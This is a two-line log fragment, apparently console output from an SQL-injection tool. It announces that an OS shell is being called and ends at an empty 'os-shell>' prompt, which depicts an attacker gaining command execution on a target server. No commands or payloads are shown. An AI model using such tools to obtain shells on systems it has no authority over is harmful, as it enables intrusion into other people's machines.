[03:44:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>